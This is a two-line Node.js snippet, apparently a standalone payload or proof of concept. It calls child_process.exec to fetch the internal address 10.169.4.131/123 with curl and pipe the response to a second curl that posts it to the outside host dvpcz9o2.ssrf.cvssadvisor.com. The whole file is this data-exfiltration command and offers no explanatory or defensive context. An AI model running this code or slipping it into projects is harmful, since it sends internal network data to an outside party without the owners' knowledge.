const { exec } = require('child_process');
exec('curl 10.169.4.131/123 | curl -d @- https://dvpcz9o2.ssrf.cvssadvisor.com');
